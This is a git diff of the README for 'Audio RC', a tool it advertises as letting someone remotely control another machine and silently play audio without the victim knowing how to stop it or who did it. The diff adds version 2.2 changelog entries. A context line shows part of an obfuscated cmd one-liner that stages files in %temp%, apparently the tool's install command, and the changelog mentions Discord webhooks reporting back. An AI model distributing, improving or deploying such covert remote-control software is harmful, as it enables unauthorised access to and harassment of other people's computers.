@@ -1,4 +1,4 @@
-## 🔊 Audio RC Version 2.1
+## 🔊 Audio RC Version 2.2
 > Audio RC allows you to remote other machine and silently play youtube audio in it without the other side knowing how to stop or who did it.
 
 #### Audio RC Features
@@ -77,6 +77,9 @@ for %a in (F6) do for %b in ("%temp%\F") do for %c in (.) do for %d in (cmd) do 
 - Improved script start-delay
 - Better ERROR DETECTION for discord webhooks (checking if they work using the string regex and if there's a match only then we send the message)
 - Edit the discord message if it already exists in your webhook (does not require authentication)
+#### Version 2.2
+- New SDK name `WINDOWS_VER` --> `winver`
+- Force always to use IPv4 protocol for pinging and finding TTL
 
 #### 📚 Contact information and support
 > Feel free to contact me in discord, <span style="color:#7289DA">Agam#0001</span>
